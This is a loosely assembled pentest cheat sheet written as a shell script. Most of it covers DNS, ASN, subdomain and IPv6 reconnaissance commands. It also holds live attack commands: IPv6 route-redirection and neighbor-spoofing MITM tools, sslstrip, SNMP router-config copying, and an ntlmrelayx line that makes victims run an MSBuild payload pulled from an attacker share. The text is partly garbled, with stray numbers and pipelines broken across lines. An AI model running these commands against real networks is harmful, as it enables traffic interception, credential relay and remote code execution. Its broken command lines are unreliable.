#!/bin/sh
##-===========================================================-##
##    [+] Xe1phix-[Recon]-[v12.4.52].sh
##-===========================================================-##





|**DNS Record types**|methods|description|
|:-----------------------|:----------|:--------------|
|dns query|A|***Address record***, Returns a 32-bit IPv4 address, most commonly used to map hostnames to an IP address of the host, but it is also used for DNSBLs, storing subnet masks in RFC 1101, etc.|
|dns query|CNAME|***Canonical name record***, Alias of one name to another: the DNS lookup will continue by retrying the lookup with the new name.|
|dns query|AAAA|***IPv6 address record***, Returns a 128-bit IPv6 address, most commonly used to map hostnames to an IP address of the host.|
|dns query|MX|***Mail exchange record***, Maps a domain name to a list of message transfer agents for that domain|
|dns query|NS|***Name server record***, Delegates a DNS zone to use the given authoritative name servers|
|dns query|SOA|***zone of authority record***, Specifies authoritative information about a DNS zone, including the primary name server, the email of the domain administrator, the domain serial number, and several timers relating to refreshing the zone.|
|dns query|SPF|***Sender Policy Framework***, a simple email-validation system designed to detect email spoofing by providing a mechanism to allow receiving mail exchangers to check that incoming mail from a domain comes from a host authorized by that domain's administrators.|
|dns query|TXT|***Text record***, Originally for arbitrary human-readable text in a DNS record.|
|dns query|PTR|***Pointer record***, Pointer to a canonical name. Unlike a CNAME, DNS processing stops and just the name is returned. The most common use is for implementing reverse DNS lookups, but other uses include such things as DNS-SD.|
|dns query|SRV|***Service locator***, Generalized service location record, used for newer protocols instead of creating protocol-specific records such as MX.|
|dns query|NSEC|***Next Secure record***, Part of DNSSEC—used to prove a name does not exist. Uses the same format as the (obsolete) NXT record.|
|dns query|AXFR|***Authoritative Zone Transfer***, Transfer entire zone file from the master name server to secondary name servers. **DNS Zone Transfer** is typically used to replicate DNS data across a number of DNS servers, or to back up DNS files. A user or server will perform a specific zone transfer request from a ―name server.‖ If the name server allows zone transfers to occur, all the DNS names and IP addresses hosted by the name server will be returned in human-readable ASCII text.|
|dns query|IXFR|***Incremental Zone Transfer***, Transfer entire zone file from the master name server to secondary name servers.|
|dns query|DNS Wildcard|Check if nameserver enable wildcard query, or dns faked.|
|dns query|domain bruteforce|bruteforce subdomains with wordlists.|
|dns query|reverse bruteforce|reverse ip for domain|
|dns query|srv bruteforce|bruteforce srv records|
|dns query|gtld bruteforce|bruteforce gtld records|
|dns query|tld bruteforce|bruteforce tld records|



##-=========================================-##
##    [+] Automatic Zone Transfer (AXFR)
##-=========================================-##


##-=========================================================-##
##    [+] Incremental Zone Transfers (IXFR)
##-=========================================================-##
## --------------------------------------------------------- ##
##   [?] Incremental zone transfer is a list of changes
## --------------------------------------------------------- ##


ping $Domain
dig -x $Domain
dig -6 AAAA $Domain
nslookup -debug $Domain
nslookup -query=ns $Domain
nslookup -querytype=mx $Domain
nslookup recursive $Domain
nslookup server $Server set type=any ls -d $Domain

                
host -l $Domain
whois $Domain


host -t ns $Domain



##-=================================-##
##   [+] Full Zone Transfer (AXFR)
##-=================================-##


dig $Domain -t axfr
host -l $Domain ns1.$Domain
dnsrecon -d $Domain -t axfr
dnsrecon -d $Domain -t axfr @ns1.$Domain
dnsenum $Domain
dnsrecon -d $Domain -t axfr @ns1.$Domain

nmap --script=dns-zone-transfer $Domain


## ----------------------------------------------------------------------------------------- ##
	nslookup server $Server set type=any ls -d $Domain		## DNS zone transfer
## ----------------------------------------------------------------------------------------- ##


##-==========================================-##
##   [+] Incremental Zone Transfer (IXFR)
##-==========================================-##



##-===========================================-##
##  [+] Metasploit - Reverse DNS (PTR) Scan
##-===========================================-##
msfconsole
> use auxiliary/gather/dns_reverse_lookup
> set RANGE 192.168.1.0/24
> run

> use auxiliary/gather/enum_dns
> use auxiliary/gather/dns



##-=======================-##
##  [+] Query MX records
##-=======================-##
dig -t MX @DNSServer mail.$Domain.com
host -t MX $Domain
nslookup -querytype=mx $Domain
systemd-resolve -t MX $Domain




##-=============================================-##
##  [+] Sender Policy Framework (SPF) Lookups
##-=============================================-##








## -------------------------------------------------------------------------------------- ##
##   [?] SOA - start of authority - Defines the authoritative information about a zone
## -------------------------------------------------------------------------------------- ##
nslookup -querytype=SOA $Domain
dig -t soa $Domain
host -t soa $Domain
## host -C $Domain



dig $Domain ANY +noall +answer
nslookup -query=any $Domain
nslookup -debug $Domain


##-=======================-##
##  [+] DNS Brute Force
##-=======================-##

##-==================================================-##
##  [+] DNSRecon - 
##-==================================================-##
dnsrecon -t brt,std,axfr -D /pentest/enumeration/dns/dnsrecon/namelist.txt -d $Domain


##-==================================================-##
##  [+] DNSRecon - host and subdomain brute force
##-==================================================-##
dnsrecon -d $Domain -D subdomains-top1mil-20000.txt -t brt --threads 10 -a


##-=======================================-##
##  [+] NMap - NSE Script - DNS Brute
##-=======================================-##
nmap -sn -Pn --script dns-brute $IP



##-===========================================-##
##  [+] DNS Brute - Subdomain Enumeration
##-===========================================-##
for sub in $(cat subdomains.txt);do host $sub.$Domain.com|grep "has.address";done
dnsrecon -d $Domain -D wordlist.txt -t std --xml output.xml


## ------------------------------------------ ##
##   [?] Show IP addresses of subdomains
## ------------------------------------------ ##
for x in $(cat /usr/share/dnsenum/dns.txt); do
     host $x.$Domain | grep 'has address' | cut -d ' ' -f1,4 >> tmp
done





Retrieve the MX record of $Domain

systemd-resolve -t MX 



Retrieve a TLS key ("=tcp" and ":443" could be skipped)

systemd-resolve --tlsa=tcp $Domain:443


##-==========================-##
##   [+] DNS Zone Walking:
##-==========================-##
dnsrecon -d $Domain -t zonewalk

fierce -dns $Domain

## --------------------------------------------------------------------------------------------------------------------------------------------- ##
##    [?] dnswalk is a DNS debugger.
## --------------------------------------------------------------------------------------------------------------------------------------------- ##
dnswalk $Domain
dnswalk -r -d $Domain

nmap --script firewalk.nse


## --------------------------------------------------------------------- ##
##    [?] Firewalk - active reconnaissance network security tool 
## --------------------------------------------------------------------- ##
firewalk -S8079-8081  -i eth0 -n -pTCP 192.168.1.1 192.168.0.1





##-==========================================================-##
## ---------------------------------------------------------- ##
##   [+] Autonomous System Number(ASN) + Netblocks Recon
## ---------------------------------------------------------- ##
##-==========================================================-##


##-==================================================-##
##   [+] NMap - Find netblocks that belong to an ASN
##-==================================================-##
nmap --script targets-asn --script-args targets-asn.asn=$ASN


##-===================================================-##
##   [+] NMap - Find Information about IP address
##-===================================================-##
nmap --script=asn-query,whois,ip-geolocation-maxmind 192.168.1.0/24


nmap --script ip-geolocation-geoplugin.nse $IP
nmap --script ip-geolocation-ipinfodb.nse $IP
nmap --script ip-geolocation-map-bing.nse $IP
nmap --script ip-geolocation-map-google.nse $IP
nmap --script ip-geolocation-map-kml.nse $IP
nmap --script ip-geolocation-maxmind.nse $IP




##-========================================-##
##   [+] Find ASN for a given IP address
##-========================================-##
curl -s http://ip-api.com/json/$IP | jq -r .as




http://asnlookup.com/api



##-===============================================-##
##   [+] RapidDNS API - Subdomain Enumeration:
##-===============================================-##
curl -s "https://rapiddns.io/subdomain/$TARGET?full=1&down=1#exportData()"
 | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"
 | sort -u | grep "$TARGET" | cut -d\/ -f3



##-===============================================-##
##   [+] Censys API - OSINT - Subdomain Finder:
##-===============================================-##
python $PLUGINS_DIR/censys-subdomain-finder/
censys_subdomain_finder.py --censys-api-id $CENSYS_APP_ID --censys-api-secret $CENSYS_API_SECRET $TARGET
 | egrep "\-" | awk '{print $2}'
 | egrep -v "Searching|Found" > $DIR/domains-$TARGET-censys.txt




##-=================================================-##
##   [+] Crt.sh API - OSINT - Domain Enumeration:
##-=================================================-##
## -------------------------------------------------------------------- ##
##   [?]  Finding Subdomains - Abusing Certificate Transparency Logs
## -------------------------------------------------------------------- ##
curl -s https://crt.sh/?q=%25.$TARGET > $DIR/domains-$TARGET-presorted.txt
cat $DIR/domains-$TARGET-presorted.txt | grep $TARGET | grep TD
 | sed -e 's/<//g' | sed -e 's/>//g' | sed -e 's/TD//g' | sed -e 's/BR/\n/g'
 | sed -e 's/\///g' | sed -e 's/ //g' | sed -n '1!p' | grep -v "*"
 | sort -u > $DIR/domains-$TARGET-crt.txt








##-=================================================================-##
##   [+] Lookup autonomous systems of all outgoing http/s traffic
##-=================================================================-##
ss -t -o state established '( dport = :443 || dport = :80 )'|grep tcp|awk '{ print $5 }'|sed s/:http[s]*//g|sort -u|netcat whois.cymru.com 43|grep -v "AS Name"|sort -t'|' -k3


##-======================================-##
##   [+] hackertarget - ASN Lookup API
##-======================================-##
curl https://api.hackertarget.com/aslookup/?q=$1 > IP_LIST.txt


##-==============================================-##
##   [+] spyse - Get Autonomous System details
##-==============================================-##
echo "AS15169" | spysecli as


##-====================================-##
##   [+] Block all FaceBook traffic
##-====================================-##
ASN=32934; for s in $(whois -H -h riswhois.ripe.net -- -F -K -i $ASN | grep -v "^$" | grep -v "^%" | awk '{ print $2 }' ); do echo " blocking $s"; sudo iptables -A INPUT -s $s -j REJECT &> /dev/null || sudo ip6tables -A INPUT -s $s -j REJECT; done



##-================================================-##
##   [+] AMass - Intel - Active - ASN Recon Scan:
##-================================================-##
amass intel -active -asn $ASN -ip


##-================================================================-##
##   [+] AMass - Enum - DNS Brute Force - Subdomain Enumeration:
##-================================================================-##
#amass enum -v -src -ip -brute -min-for-recursive 2 -d $Domain


##-============================================-##
##   [+] AMass - Intel - Reverse Whois Scan:
##-============================================-##
amass intel -whois -d $TARGET > $DIR/domains-$TARGET-reverse-whois.txt



##-==================================================-##
##   [+] AMass - DNS Subdomain - Enumeration Scan:
##-==================================================-##
amass enum -ip -o $DIR/domains-$TARGET-amass.txt -rf /usr/share/sniper/plugins/massdns/lists/resolvers.txt -d $TARGET



##-==================================================================-##
##   [+] Sn1per - Sublist3r Plugin - Subdomain - Enumeration Scan:
##-==================================================================-##
python /usr/share/sniper/plugins/Sublist3r/
sublist3r.py -d $TARGET -vvv -o $DIR/domains-$TARGET.txt


##-=======================================================-##
##   [+] SubFinder - DNS Subdomain - Enumeration Scan:
##-=======================================================-##
subfinder -o $DIR/domains-$TARGET-subfinder.txt -b -d $TARGET -w $DOMAINS_DEFAULT -t 100


##-==================================================================-##
##   [+] DNScan - DNS Brute Force - Subdomain Enumeration Scan:
##-==================================================================-##
python3 $PLUGINS_DIR/dnscan/
dnscan.py -d $TARGET -w $DOMAINS_QUICK -o $DIR/domain-dnscan-$TARGET.txt -i $DIR/Domain-IPs-$TARGET.txt










dns-srv-enum.nse
dns-recursion.nse
dns-service-discovery.nse
dns-client-subnet-scan.nse
dns-fuzz.nse
dns-check-zone.nse




dns-cache-snoop.nse


dnsrecon --type snoop -n $Server -D $Dict		## Cache Snooping











sniper -t $Domain -o -re



bing-ip2hosts -p $IP
automater -s robtex $IP
dnsmap -w $File.txt $Domain
dnstracer $Domain
sublist3r -d $Domain
subfinder -d $Domain
subjack $Domain
dnsenum $Domain
dnsrecon -d $Domain -t axfr
dnsrecon --type snoop -n $Server -D $Dict		## Cache Snooping
fierce -dns $Domain
dnswalk -r -d $Domain
dnstracer -r 3 -v $Domain

dnsdict6 -4 -d -t 16 -e -x $Domain

massdns -r $Dir/$Resolvers.txt -t A -q -o S $File.txt
dnscan --domain $Domain --wordlist $File -o $Dir/dnscan-$Domain.txt


# 1st resolve subdomains on valid websites
##   [?] https://github.com/projectdiscovery/httpx
cat subdomains.txt | httpx -follow-host-redirects -random-agent -status-code -silent -retries 2 -title -web-server -tech-detect -location -o webs_info.txt
##\_____________________/##
##   [?] Clean output:
## --------------------- ##
cat webs_info.txt | cut -d ' ' -f1 | grep ".domain.com" | sort -u > websites.txt


##   [?] https://github.com/projectdiscovery/dnsx
dnsx -retry 3 -a -aaaa -cname -ns -ptr -mx -soa -resp -silent -l subdomains.txt


dnsviz





## ------------------------------------------------------------------------------------------ ##
    dnstwist --registered $Domain           ## Show only registered domain names
## ------------------------------------------------------------------------------------------ ##
    dnstwist --dictionary $File $Domain     ## Generate more domains using dictionary FILE
## ------------------------------------------------------------------------------------------ ##
    dnstwist --geoip $Domain                ## Lookup for GeoIP location
## ------------------------------------------------------------------------------------------ ##
    dnstwist --mxcheck $Domain              ## Check if MX can be used to intercept emails
## ------------------------------------------------------------------------------------------ ##
    dnstwist --whois $Domain                ## Lookup WHOIS database for creation date
## ------------------------------------------------------------------------------------------ ##
    dnstwist --tld $File $Domain            ## Generate more domains by swapping TLD from FILE
## ------------------------------------------------------------------------------------------ ##
    dnstwist --nameservers $DNS $Domain     ## DNS servers to query
## ------------------------------------------------------------------------------------------ ##
    dnstwist --all $Domain                  ## Show all DNS records
## ------------------------------------------------------------------------------------------ ##
    dnstwist --banners $Domain              ## Determine HTTP and SMTP service banners
## ------------------------------------------------------------------------------------------ ##





LinEnum.sh -s -k $Keyword -r $ReportName -e /$Dir/ -t 


httprint -h -s $Domain signatures.txt -P0



## --------------------------------------------------------------------------------------------------------------------------------------------- ##
##    [?] enumerate DNS information of a domain and to discover non-contiguous ip blocks.
## --------------------------------------------------------------------------------------------------------------------------------------------- ##
dnsenum --noreverse -o $File.xml $Domain

## --------------------------------------------------------------------------------------------------------------------------------------------- ##
##    [?] dnswalk is a DNS debugger.
## --------------------------------------------------------------------------------------------------------------------------------------------- ##
dnswalk $Domain
#
dnswalk -r -d $Domain

									## ----------------------------------------------------------- ##
dnswalk -r -d $* $Domain.		    ## Recursively descend sub-domains of the specified domain.
									## Print debugging and 'status' information to stderr
									## ----------------------------------------------------------- ##

									## ---------------------------------------------------- ##
dnswalk -F $Domain					## perform "fascist" checking
									## ---------------------------------------------------- ##
									##  [?] When checking an A record,
									##      compare the PTR name for each IP address
									##      with the forward name and report mismatches.
									## ---------------------------------------------------- ##


## --------------------------------------------------------------------------------------------------------------------------------------------- ##
##    [?] 
## --------------------------------------------------------------------------------------------------------------------------------------------- ##
dnsmap $Domain -w /usr/share/wordlists/dnsmap.txt

## --------------------------------------------------------------------------------------------------------------------------------------------- ##
##    [?] DNSMAP-BULK USAGE EXAMPLE
## --------------------------------------------------------------------------------------------------------------------------------------------- ##
echo "$Domain" >> $File.txt
echo "example.org" >> $File.txt
dnsmap-bulk.sh $File.txt


dnsrecon -d $Domain -D /usr/share/wordlists/dnsmap.txt -t std --xml $File.xml
dnsrecon -d $domain -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ag


##-==============================================-##
##   [+] Run massdns to determine online hosts
##-==============================================-##
massdns -r $RESOLVERS -q -t A -o -S -w $File.out $File-merged.txt
cat $File.out | awk '{print $1}' | sed 's/\.$//' | sort -u > $File-online.txt


massdns -r $Dir/resolvers.txt -t A -q -o S $File.txt
massdns -r /$Dir/massdns/lists/resolvers.txt -t A -q -o S -w $Dir/massdns.out all.txt



##-============================================================================-##
##   [+] Produce a list of IP addresses corresponding to the target's FQDNs:
##-============================================================================-##
cat $File.out | awk '{split($0,a," "); print a[3]}' | sort | uniq >> $File-FQDNs.txt



massdns -r lists/resolvers.txt -t CNAME all.txt -o S > $File.txt



masscan -p 443 -sS -Pn -n --randomize-hosts -v $line > $File.txt

masscan -p-65535 $(dig +short $Domain) --rate 10000



masscan -p1-65535 $(dig +short $1|grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"|head - --max-rate 1000




knockpy $TARGET --json 1>/dev/null 2>knockpy.tmp
KNOCKPY_REPORT=$(cat knockpy.tmp | grep : | awk -F': ' '{print $2}')
cat $KNOCKPY_REPORT | jq '.found.subdomain[]' | sed 's/"//g' >> knockpy.tmp
echo "  - Found: $(cat knockpy.tmp | wc -l)"


knockpy -w /pentest/lists/dns/namelist.txt $TARGET




## --------------------------------------------- ##
##  [?] Enumerates a domain for DNS entries
## --------------------------------------------- ##
dnsdict6 -4 -d -t 16 -e -x $Domain

dnsdict6 $TARGET $DNS_FILE -4 | awk '{print $1}' | sort -u | sed -r 's/.com./.com/g'


dnsdict6 $TARGET $DNS_FILE -4 | awk '{print $1}' | sort -u | sed -r 's/.com./.com/g'


atk6-alive6 eth0 -l > /dev/null && atk6-alive6 eth0 > /dev/null && arp-scan -l | head -n -2 | tail -n +3 > arp && ip -6 neigh > neigh && for line in $(cat neigh | cut -d" " -f5 |sort -u); do grep $line arp && grep $line neigh && echo -e '\n';  done; rm arp neigh

785*

ping6 ff02::2%eth0			## all routers address
ping6 ff02::1%eth0			## all nodes address

ping6 ff02::1%eth0
ping6 -c 6 ff02::1%eth0
ping6 –c 4 fe80::c418:2ed0:aead:cbce%eth0


##-==========================================-##
##   [+] -
##-==========================================-##
## ----------------------------------------------------------------- ##
##   [?]
## ----------------------------------------------------------------- ##
inverse_lookup6 eth0 $MAC		## Get IPv6 from a MAC addresses



ICMPv6 Router Discovery




##-==================================================-##
##   [+] atk6-redir6 - IPv6 Evil AP - MITM Attack 
##-==================================================-##
## ----------------------------------------------------------------- ##
##   [?] Implant a route into $SrcIP which;
##   [?] Redirects all traffic from $TargetIP to $NewIP 
## ----------------------------------------------------------------- ##
redir6 eth0 $SrcIP $TargetIP  <original-router> <new-router> $NewRouterMAC


##-==========================================-##
##   [+] -
##-==========================================-##
## ----------------------------------------------------------------- ##
##   [?]
## ----------------------------------------------------------------- ##


##-=============================================================-##
##   [+] dnsdict6 - Enumerate a domain for DNS Record Entries
##-=============================================================-##
## --------------------------------------------------------------------- ##
##   [?] ENUMERATE SRV SERVICE RECORDS
##   [?] ENUMERATE IPV4 IPV6, NAME SERVER, MAIL SERVER WITH OPTIONS
## --------------------------------------------------------------------- ##
atk6-dnsdict6 $Domain
atk6-dnsdict6 -d $Domain				## NS and MX DNS domain information
atk6-dnsdict6 -S $Domain				## perform SRV service name guessing
atk6-dnsdict6 -d46 -t 32 $Domain		## number of threads




##-====================================================-##
##   [+] Performs reverse DNS enumeration given an IPv6 address.
##-====================================================-##
atk6-dnsrevenum6
atk6-dnsrevenum6 $DNSServer $IPv6Addr/64


##-====================================================-##
##   [+] traceroute that uses ICMP6.
##-====================================================-##
atk6-trace6
atk6-trace6 -d eth0 $TargetIP $Port


##-=======================================================-##
##   [+] Alive6 - Find activities on local network
##-=======================================================-##
## ------------------------------------------------------- ##
##   [?] Detect ICMPv6 echo-reply on global addresses
##   [?] Shows  alive addresses in the segment
## ------------------------------------------------------- ##
atk6-alive6 eth0
atk6-alive6 eth0 -v
atk6-alive6 tun6to4

-V         enable debug output
  -d         DNS resolve alive IPv6 addresses
  -H         print hop count of received packets

-i $File

-Z $Mac     ## Use given destination MAC address



##-=============================================================-##
##   [+] detects new ipv6 addresses joining the local network
##-=============================================================-##
atk6-detect-new-ip6 eth0

##-==========================================-##
##   [+] Announce yourself as a router
##   [+] try to become the default router
##-==========================================-##
atk6-fake_router6 eth0 1::/64
atk6-fake_router6 eth0 1::/64 $MTU $MAC


##-=======================================================-##
##   [+] Dumps all local routers and their information
##-=======================================================-##
atk6-dump_router6 eth0


##-===============================================-##
##   [+] Advertise ipv6 address on the network
##-===============================================-##
## ------------------------------------------------------------------------------ ##
##   [?] sending it to the all-nodes multicast address if no target specified.
## ------------------------------------------------------------------------------ ##
atk6-fake_dhcps6 eth0 1::/64 $DNSServer


##-=======================================================-##
##   [+] Dumps all DHCPv6 servers and their information
##-=======================================================-##
atk6-dump_dhcp6 eth0



##-==========================================-##
##   [+] parasite6 - ARP spoofer for IPv6
##-==========================================-##
## ----------------------------------------------------------------- ##
##   [?] redirecting all local traffic to your own  system
##   [?] by answering falsely to Neighbor Solicitation requests
##   [?] specifying FAKE-MAC results in a local DOS.
## ----------------------------------------------------------------- ##
atk6-parasite6 eth0 $FakeMAC
atk6-parasite6 -l eth0



## ------------------------------------------------------------------------ ##
##   [?] tcp6 - A security assessment tool for TCP/IPv6 implementations

tcp6  is  a security assessment tool for attack vectors based on TCP/IPv6 packets.



udp6 is a tool for sending arbitrary IPv6-based UDP datagrams.


rs6 is a security assessment tool for attack vectors based on Router Solicitation messages

rd6 is a security assessment tool for attack vectors based on ICMPv6 Redirect messages

ns6 is a security assessment tool for attack vectors based on Neighbor Solicitation messages

Neighbor Cache poisoning attacks
Neighbor Cahe exhaustion attacks


path6 is a versatile IPv6-based traceroute tool


ra6  is a security assessment tool for attack vectors based on Router Advertisement messages


scan6 is a full-fledged IPv6 address scanning tool


flow6 allows the security assessment of the IPv6 Flow Label. 

frag6 is a security assessment tool for the IPv6 fragmentation mechanism. 
fragmentation-based attacks

Fragment Identification generation policy
IPv6 atomic fragments


jumbo6 is a secuity assessment tool for IPv6 Jumbograms.

na6  is a security assessment tool for attack vectors based on Neighbor Advertisement messages
Neighbor Cache poisoning attacks, 
DAD attacks

ni6 is a security assessment tool for attacks vectors and reconnaissance  techniques  
based  on  ICMPv6 Node Information messages.


icmp6 is a security assessment tool for the ICMPv6 protocol. 
It can easily produce arbitrary ICMPv6 error messages
icmp6 can also be used to send crafted ICMPv6 messages of arbitrary type/code combinations.



addr6  is an IPv6 address analysis and manipulation tool. Given a list of IPv6 addresses, it can filter
       such list based on different criteria, such as IPv6 address type, IPv6 address scope, IPv6 prefix, etc.
       Additionally,  given a list of IPv6 addresses addr6 can produce statistics on such addresses, including
       address scopes, types, and type of IPv6 interface identifier.  addr6 can also analyze a single address,
       producing script-friendly output, such that its analysis can be leveraged by other tools or scripts.

       blackhole6  is  a  troubleshooting  tool which can find IPv6 where in the network topology packets with
       specific IPv6 Extension Headers are being dropped.





ipv6toolkit.conf - Configuration file for the SI6 Networks' IPv6 address monitoring daemon (ipv6mon)






mitm6

138513







dnscan --domain $Domain --wordlist $File -o $Dir/dnscan-$Domain.txt


dnscan -d $Domain -w $Domains QUICK -o $Dir/domains-dnscan-$Domain.txt





ping $Domain
tcptraceroute -i eth0 $Domain
traceroute -T -O info -i eth0 $Domain
nbtscan -r 192.168.0.1-100
nbtscan -f $HostFile.txt
nmap -p 53 --script=*dns* -vv -oN dns $ip
nmap -PN -n -F -T4 -sV -A -oG $File.txt $Domain
amap -d $IP $PORT
cisco-torch -A $IP

hping3 $Domain

fping -a 192.168.0.1-100
bing $IP
oping

mtr $Domain
tcptraceroute -i eth0 $Domain
tracepath $Domain
tcptrace -l -r o3 $File
intrace -h $Domain
itrace -i eth0 -d $Domain
0trace eth0 $Domain
tctrace -i eth0 -d $Domain
tcpflow -p -c -i eth0 port 80
tcpxtract --file $File.pcap --output $File --device eth0
tcpstat -i eth0 -o "Time: %S\tpps: %p\tpacket count: %n\tnet load: %l\tBps: %B\n"

sniffit
packit
ostinato
firewalk


ifpps -dev eth0
ifpps -lpcd wlan0           ## Continuous terminal output for the wlan0
ifpps -pd eth0              ## eth0 device in promiscuous mode.

iftop -i eth0 -f 'port (80 or 443)'
iftop -i eth0 -f 'ip dst 192.168.1.5'
iftop -i eth0 -F 192.168.1.0/255.255.255.0



##-=======================-##
##  [+] IPv6 Traceroute:
##-=======================-##
traceroute6 $Domain
path6 -v -u 72 -d $Domain		            ## Traceroute EH-enabled
mtr -6 $Domain

traceproto 
tracepath 
tracepath6 $Domain
itrace -v -i eth0 -d $Domain        ## traceroute implementation using ICMP echo request packets
tctrace -v -i eth0 -d $Domain       ## traceroute implementation using TCP SYN packets
tcptraceroute                       ## traceroute implementation using TCP packets.
tcptraceroute -A                    ## Set the TCP ACK flag in outgoing packets.        ## By doing so, it is possible to trace through stateless firewalls which permit outgoing TCP connections.

tcptrace -b                         ## brief output format
tcptrace -l                         ## long output format


arp-scan --interface=eth0 192.168.0.0/24



netdiscover -r $IP
netdiscover -i eth0 -r $IP -s 100 -N -P >> netdiscover.log


##-====================================-##
##   [+] Only sniff for ARP traffic
##-====================================-##
netdiscover -p


##-===========================================-##
##   [+] Scan common LAN addresses on eth0:
##-===========================================-##
netdiscover -i eth0


##-================================================-##
##   [+] Fast scan common LAN addresses on eth0 
##-================================================-##
## ------------------------------------------------ ##
##    [?] (search only for gateways):
## ------------------------------------------------ ##
netdiscover -i eth0 -f


##-============================-##
##   [+] Scan fixed ranges:
##-============================-##
netdiscover -i eth0 -r 172.26.0.0/24
netdiscover -r 192.168.0.0/16
netdiscover -r 10.0.0.0/8



##-==================================================================================-##
##  [+] CrackMapExec - Pentesting tool for Windows/Active Directory Environments
##-==================================================================================-##
## ---------------------------------------------------------------------------------- ##
##    [?] Enumerating logged on users
##    [?] Spidering SMB Shares
##    [?] Executing psexec style attacks
##    [?] Autoinjecting Mimikatz/Shellcode/DLLs into memory using Powershell
##    [?] Eumping the NTDS.dit
## ---------------------------------------------------------------------------------- ##




crackmapexec 192.168.1.0/24



## ---------------------------------------------- ##
##    [?] CrackMapExec - Generate Relay List
## ---------------------------------------------------------------------------------- ##
crackmapexec smb --gen-relay-list $File.txt $IP/24





impacket-ntlmrelayx -smb2support --no-smb-server -t $IP -c 'cmd /c "net use \\$IP\smb \user:kali redteam & C:\Windows\Microsoft.NET\Framework64\v5.0.30319\MSBuild.exe \\$IP\smb\rt.xml"'










ndisc6

atk6-trace6 -d eth0 $TargetIP $Port
atk6-alive6 eth0 -v
atk6-detect-new-ip6 eth0
atk6-dump_router6 eth0
atk6-dump_dhcp6 eth0
atk6-passive_discovery6 eth0

script6 get-as $IPv6Addr
script6 get-asn $IPv6Addr
cat $File.txt | script6 get-aaaa



nmap -6 -sT $DOMAIN						## Nmap scan
nmap -6 -sT ::1							## localhost

scan6 -v -i eth0 -­d $DOMAIN/64			## Domain scanning
scan6 -v -i eth0 -­d $IPv6ADDR/64			## Address scanning

scan6 -i eth0 -L -e --print-type global	## Discover global & MAC addresses

scan6 -i eth0 --local-scan --rand-src-addr --verbose		## Link-local & Global addresses :+1:


#targets-ipv6-multicast-echo: Sends ICMPv6 echo to all nodes link local ff02::1 -script-args newtargets,interface=, may need -SL
#targets-ipv6-multicast-invalid-dst: Sends ICMPv6 with invalid extension to all nodes link-local (ff02::1) for Windows responses. --script-args 'newtargets,interface=', may need -sP
#targets-ipv6-multicast-mld: Sends multicast listener discovery to link-local (ff02::1), resp set to 1 to provoke immediate response. --script-args 'newtargets,interface='
nmap -6 -n --script targets-ipv6-multicast-echo,targets-ipv6-multicast-invalid-dst,targets-ipv6-multicast-mld -oA 


dns-ip6-arpa-scan.nse


gobuster dir -u $Domain -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
joomscan -u $Domain
nikto -h $Domain -port 443 -Format htm --output $Domain.html
uniscan -u $Domain -qweds
wafw00f $Domain
whatweb $Domain
wpscan --url $Domain

cisco-torch -A 192.168.99.202
copy-router-config.pl 192.168.1.1 192.168.1.15 private
merge-router-config.pl 192.168.1.1 192.168.1.15 private


sslscan $Domain
sslyze $Domain
sslscan --ipv4 --show-certificate --ssl2 --ssl3 --tlsall --no-colour $Domain
sslyze -regular $Domain
sslcaudit -l 0.0.0.0:443 -v 1
sslstrip -w sslstrip.log -l 8080
tlssled $Domain 443
testssl.sh -e -E -f -p -y -Y -S -P -c -H -U $IP



## --------------------------------------------------------------------------------------------------------------------------------------------- ##
##		[+]  DMitry (Deepmagic Information Gathering Tool)
## --------------------------------------------------------------------------------------------------------------------------------------------- ##
##    [?] 
## --------------------------------------------------------------------------------------------------------------------------------------------- ##
dmitry -winsepo $File.txt $Domain


automater -s robtex $IP


## --------------------------------------------------------------------------------------------------------------------------------------------- ##
##    [?] hping3 - send ICMP echo requests. It supports TCP, UDP, ICMP and RAW-IP protocols
## --------------------------------------------------------------------------------------------------------------------------------------------- ##
hping3 --traceroute -V -1 $Domain

## --------------------------------------------------------------------------------------------------------------------------------------------- ##
##    [?] InTrace - enumerate IP hops exploiting existing TCP connections
## --------------------------------------------------------------------------------------------------------------------------------------------- ##
intrace -h $Domain -p 80 -s 4


amap -bqv 192.168.1.15 80
amap -bqv1 1-65535 $TARGET



# Metasploit DNS Auxiliarys:
metasploit> use auxiliary/gather/dns

msf > use auxiliary/gather/enum_dns

## ------------------------------------------------------------------------------ ##
##   [?] find zombie ip in network to use them to scan:
## ------------------------------------------------------------------------------ ##
use auxiliary/scanner/ip/ipidseq
nmap -sI ip target

ipidseq.nse



https://github.com/rebootuser/LinEnum



## --------------------------------------------------------------------------------------------------------------- ##
    dnsrecon -t rvs -i 192.1.1.1,192.1.1.20				## Reverse lookup for IP range:
## --------------------------------------------------------------------------------------------------------------- ##
    dnsrecon -t std -d $Domain.com						## Retrieve standard DNS records:
## --------------------------------------------------------------------------------------------------------------- ##
    dnsrecon -t brt -d $Domain.com -w $Hosts.txt	## Enumerate subdornains:
## --------------------------------------------------------------------------------------------------------------- ##
    dnsrecon -d $Domain.com -t axfr						## DNS zone transfer:
## --------------------------------------------------------------------------------------------------------------- ##
    dnsrecon --type snoop -n $Server -D $Dict		## Cache Snooping
## --------------------------------------------------------------------------------------------------------------- ##
    dnsrecon -d $Host -t zonewalk							## Zone Walking
## --------------------------------------------------------------------------------------------------------------- ##





##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] DHCP - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


dhcp-discover.nse



nmap -A -sU -sV -Pn -v --script-timeout 90 --script=dhcp*,/usr/share/nmap/scripts/vulners -p 68 $TARGET












strace ffmpeg -i /dev/video0 $File.jpg



echo "[+] Lookup autonomous systems of all outgoing http/s traffic"
ss -t -o state established '( dport = :443 || dport = :80 )' | grep -Po '([0-9a-z:.]*)(?=:http[s])' | sort -u|netcat whois.cymru.com 43|grep -v "AS Name"|sort -t'|' -k3




echo "[+] Lookup autonomous systems of all outgoing http/s traffic"
ss -t -o state established '( dport = :443 || dport = :80 )'|grep tcp|awk '{ print $5 }'|sed s/:http[s]*//g|sort -u|netcat whois.cymru.com 43|grep -v "AS Name"|sort -t'|' -k3





##-===========================================================-##
